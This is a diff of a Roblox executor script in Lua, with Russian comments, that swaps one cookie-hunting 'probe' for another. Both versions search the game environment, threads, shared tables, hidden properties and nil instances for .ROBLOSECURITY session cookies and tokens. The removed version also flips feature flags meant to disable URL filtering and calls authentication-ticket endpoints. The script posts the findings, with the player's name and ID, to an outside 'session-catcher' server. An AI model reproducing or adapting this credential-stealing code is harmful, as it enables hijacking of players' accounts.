@@ -1,5 +1,5 @@
 -- ============================================================
---  Probe D — User table + shared + threads + fflag + RequestAsync + Actor
+--  Probe B — gethiddenproperties + getproperties + getnilinstances
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -10,211 +10,122 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local userTable = {}
-local sharedTable = {}
-local threadEnvs = {}
-local threadCount = 0
-local fflagResults = {}
-local requestAsync = {}
-local actorResults = {}
+local hiddenPropertiesAll = {}
+local propertiesAll = {}
+local nilInstances = {}
 
 -- -----------------------------------------------------------
--- 1. User table из getrenv
+-- 1. gethiddenproperties на всех сервисах
 -- -----------------------------------------------------------
-pcall(function()
-    if getrenv then
-        local renv = getrenv()
-        if renv and renv.User and type(renv.User) == "table" then
-            for k, v in pairs(renv.User) do
-                if type(v) == "string" then
-                    userTable[tostring(k)] = v:sub(1, 500)
-                elseif type(v) == "number" or type(v) == "boolean" then
-                    userTable[tostring(k)] = tostring(v)
-                elseif type(v) == "table" then
-                    local sub = {}
-                    for k2, v2 in pairs(v) do
-                        sub[tostring(k2)] = tostring(v2):sub(1, 200)
-                    end
-                    userTable[tostring(k)] = sub
-                else
-                    userTable[tostring(k)] = type(v)
-                end
-            end
-        else
-            userTable["error"] = "User table not found or not a table"
-        end
-    end
-end)
+local services = {
+    {"Players", game:GetService("Players")},
+    {"NetworkClient", game:GetService("NetworkClient")},
+    {"ReplicatedFirst", game:GetService("ReplicatedFirst")},
+    {"RbxAnalyticsService", game:GetService("RbxAnalyticsService")},
+    {"PlatformUserService", game:GetService("PlatformUserService")},
+    {"DataStoreService", game:GetService("DataStoreService")},
+    {"ScriptContext", game:GetService("ScriptContext")},
+    {"TeleportService", game:GetService("TeleportService")},
+    {"HttpService", game:GetService("HttpService")},
+    {"game", game},
+    {"LocalPlayer", LocalPlayer},
+}
 
--- -----------------------------------------------------------
--- 2. shared table
--- -----------------------------------------------------------
-pcall(function()
-    if shared and type(shared) == "table" then
-        for k, v in pairs(shared) do
-            if type(v) == "string" then
-                if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
-                    sharedTable[tostring(k)] = "COOKIE: " .. v:sub(1, 500)
-                else
-                    sharedTable[tostring(k)] = v:sub(1, 300)
+for _, pair in ipairs(services) do
+    local name = pair[1]
+    local svc = pair[2]
+    
+    -- gethiddenproperties (множественное)
+    pcall(function()
+        if gethiddenproperties then
+            local props = gethiddenproperties(svc)
+            if props and type(props) == "table" then
+                local dump = {}
+                for k, v in pairs(props) do
+                    dump[tostring(k)] = tostring(v):sub(1, 300)
                 end
-            elseif type(v) == "table" then
-                local sub = {}
-                for k2, v2 in pairs(v) do
-                    if type(v2) == "string" then
-                        if v2:find("_|WARNING") or v2:find("ROBLOSECURITY") then
-                            sub[tostring(k2)] = "COOKIE: " .. v2:sub(1, 300)
-                        else
-                            sub[tostring(k2)] = v2:sub(1, 200)
-                        end
-                    else
-                        sub[tostring(k2)] = tostring(v2):sub(1, 100)
-                    end
-                end
-                sharedTable[tostring(k)] = sub
+                hiddenPropertiesAll[name] = dump
             else
-                sharedTable[tostring(k)] = type(v)
+                hiddenPropertiesAll[name] = "empty or nil"
             end
         end
-    end
-end)
+    end)
+    task.wait(0.1)
+    
+    -- getproperties (множественное)
+    pcall(function()
+        if getproperties then
+            local props = getproperties(svc)
+            if props and type(props) == "table" then
+                local dump = {}
+                for k, v in pairs(props) do
+                    local vStr = tostring(v)
+                    -- Ищем куку
+                    if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
+                        dump[tostring(k)] = "COOKIE: " .. vStr:sub(1, 500)
+                    else
+                        dump[tostring(k)] = vStr:sub(1, 200)
+                    end
+                end
+                propertiesAll[name] = dump
+            end
+        end
+    end)
+    task.wait(0.1)
+end
 
 -- -----------------------------------------------------------
--- 3. getallthreads — сканируем env каждого потока
+-- 2. getnilinstances — ищем скрытые объекты
 -- -----------------------------------------------------------
 pcall(function()
-    if getallthreads then
-        local threads = getallthreads()
-        if threads then
-            threadCount = #threads
-            for i, thread in ipairs(threads) do
-                pcall(function()
-                    local env = getfenv(thread)
-                    if env and type(env) == "table" then
-                        for k, v in pairs(env) do
-                            if type(v) == "string" then
-                                if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
-                                    table.insert(threadEnvs, "Thread[" .. tostring(i) .. "] " .. tostring(k) .. ": " .. v:sub(1, 500))
-                                end
+    if getnilinstances then
+        local instances = getnilinstances()
+        if instances then
+            for _, inst in ipairs(instances) do
+                local name = inst.Name or "?"
+                local className = inst.ClassName or "?"
+                local entry = name .. " (" .. className .. ")"
+                
+                -- Проверяем скрытые свойства
+                if gethiddenproperties then
+                    local ok, props = pcall(gethiddenproperties, inst)
+                    if ok and props then
+                        for k, v in pairs(props) do
+                            local vStr = tostring(v)
+                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") 
+                               or vStr:find("cookie") or vStr:find("token") then
+                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
                             end
                         end
                     end
-                end)
-            end
-        end
-    end
-end)
-
--- -----------------------------------------------------------
--- 4. setfflag — пробуем включить HTTP
--- -----------------------------------------------------------
-pcall(function()
-    if setfflag then
-        local flags = {
-            {"FFlagHttpServiceEnabled", "true"},
-            {"FFlagDebugEnableHttpPost", "true"},
-            {"FFlagEnableHttpPost", "true"},
-            {"FFlagDisableUrlFilter", "true"},
-            {"FFlagEnableAuthTicketApi", "true"},
-            {"FFlagEnableRequestAsync", "true"},
-            {"DFFlagDebugAllowHttpPost", "true"},
-            {"FFlagDebugDisableUrlFiltering", "true"},
-        }
-        for _, pair in ipairs(flags) do
-            local ok, res = pcall(setfflag, pair[1], pair[2])
-            fflagResults[pair[1]] = ok and "set" or "ERR: " .. tostring(res):sub(1, 100)
-        end
-    end
-end)
-
--- Если setfflag сработал — пробуем HttpPost
-pcall(function()
-    local ok, resp = pcall(function()
-        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
-    end)
-    fflagResults["postAfterFflag"] = tostring(ok) .. ": " .. tostring(resp):sub(1, 300)
-end)
-
--- -----------------------------------------------------------
--- 5. HttpService:RequestAsync
--- -----------------------------------------------------------
-pcall(function()
-    local hs = game:GetService("HttpService")
-    local urls = {
-        "https://users.roblox.com/v1/users/authenticated",
-        "https://auth.roblox.com/v1/authentication-ticket",
-        "https://www.roblox.com/my/settings/json"
-    }
-    for _, url in ipairs(urls) do
-        local ok, resp = pcall(function()
-            local req = {
-                Url = url,
-                Method = "GET",
-                Headers = {}
-            }
-            return hs:RequestAsync(req)
-        end)
-        if ok and resp then
-            local dump = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. tostring(resp.Body):sub(1, 300)
-            if resp.Headers then
-                for k, v in pairs(resp.Headers) do
-                    dump = dump .. " H:" .. tostring(k) .. "=" .. tostring(v):sub(1, 200)
                 end
+                
+                -- Проверяем обычные свойства
+                if getproperties then
+                    local ok2, props2 = pcall(getproperties, inst)
+                    if ok2 and props2 then
+                        for k, v in pairs(props2) do
+                            local vStr = tostring(v)
+                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
+                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
+                            end
+                        end
+                    end
+                end
+                
+                table.insert(nilInstances, entry)
             end
-            requestAsync[url] = dump
-        else
-            requestAsync[url] = "ERR: " .. tostring(resp):sub(1, 200)
         end
-        task.wait(0.3)
-    end
-end)
-
--- -----------------------------------------------------------
--- 6. run_on_actor — пробуем HTTP в actor контексте
--- -----------------------------------------------------------
-pcall(function()
-    if run_on_actor then
-        local ok, res = pcall(run_on_actor, function()
-            -- Пробуем game:HttpPost в actor context
-            local postOk, postRes = pcall(function()
-                return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
-            end)
-            return tostring(postOk) .. ": " .. tostring(postRes):sub(1, 300)
-        end)
-        if ok then
-            actorResults["HttpPost"] = tostring(res):sub(1, 400)
-        else
-            actorResults["HttpPost"] = "ERR: " .. tostring(res):sub(1, 200)
-        end
-        
-        -- Также пробуем game:HttpGet к auth endpoint
-        local ok2, res2 = pcall(run_on_actor, function()
-            local getOk, getRes = pcall(function()
-                return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
-            end)
-            return tostring(getOk) .. ": " .. tostring(getRes):sub(1, 300)
-        end)
-        if ok2 then
-            actorResults["HttpGet"] = tostring(res2):sub(1, 400)
-        else
-            actorResults["HttpGet"] = "ERR: " .. tostring(res2):sub(1, 200)
-        end
-    else
-        actorResults["error"] = "run_on_actor not available"
     end
 end)
 
 local payload = {
-    probe = "D — User/shared/threads/fflag/RequestAsync/Actor",
+    probe = "B — Hidden Props + Nil Instances",
     username = LocalPlayer.Name,
     userId = LocalPlayer.UserId,
-    userTable = userTable,
-    sharedTable = sharedTable,
-    threadEnvs = threadEnvs,
-    threadCount = threadCount,
-    fflagResults = fflagResults,
-    requestAsync = requestAsync,
-    actorResults = actorResults,
+    hiddenPropertiesAll = hiddenPropertiesAll,
+    propertiesAll = propertiesAll,
+    nilInstances = nilInstances,
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
 
@@ -227,4 +138,4 @@ pcall(function()
     })
 end)
 
-print("[Probe D] sent. Threads: " .. threadCount .. " | Fflags: " .. table.getn(fflagResults))
+print("[Probe B] sent. Services: " .. #services .. " | Nil instances: " .. #nilInstances)
